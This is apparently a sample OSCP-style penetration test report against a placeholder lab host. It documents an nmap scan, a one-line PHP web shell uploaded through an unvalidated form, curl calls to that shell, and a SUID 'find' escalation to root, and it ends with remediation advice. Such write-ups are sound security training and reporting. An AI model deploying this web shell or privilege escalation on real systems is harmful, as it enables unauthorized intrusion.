---
title: "OSCP Penetration Test Report"
author: "Operator"
date: "2025-01-01"
target: "10.10.10.X"
---

# Executive Summary

This document presents the results of a penetration test conducted against the target environment.

## Scope

| Item | Value |
|------|-------|
| Target IP | 10.10.10.X |
| Engagement | Internal Pentest |
| Duration | 1 day |

## Findings Summary

| ID | Title | Severity | CVSS |
|----|-------|----------|------|
| F-01 | RCE via Upload | Critical | 9.8 |
| F-02 | Weak Credentials | High | 7.5 |
| F-03 | Information Disclosure | Medium | 5.3 |

---

# Enumeration

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.10.X
```

```
PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 8.9
80/tcp    open   http     Apache httpd 2.4.54
443/tcp   open   https    Apache httpd 2.4.54
```

## Web Application

Initial reconnaissance revealed a web application on port 80.

![Nmap scan results](img/nmap.png)

---

# Exploitation

## F-01 — Remote Code Execution via File Upload

**Severity:** 🔴 Critical  
**CVSS:** 9.8  

### Description

The web application allowed uploading arbitrary files without proper validation, leading to remote code execution.

### Steps to Reproduce

1. Navigate to `/upload`
2. Upload a PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

3. Access the shell:

```bash
curl http://10.10.10.X/uploads/shell.php?cmd=id
# uid=www-data(www-data) gid=www-data(www-data)
```

### Impact

Full remote code execution as the web server user.

### Remediation

- Implement strict file type validation (whitelist approach)
- Store uploaded files outside the web root
- Disable PHP execution in upload directories

---

# Post-Exploitation

## Privilege Escalation

After gaining initial access, enumeration revealed a SUID binary:

```bash
find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/find
```

Exploiting `find`:

```bash
find . -exec /bin/sh -p \; -quit
# id
uid=0(root) gid=0(root)
```

---

# Credentials Obtained

| Username | Password | Service | Notes |
|----------|----------|---------|-------|
| admin | admin123 | HTTP | Default credentials |
| root | toor | SSH | Weak password |

---

# Recommendations

1. Implement proper file upload validation
2. Apply principle of least privilege
3. Remove SUID from unnecessary binaries
4. Enable audit logging
5. Conduct regular security assessments
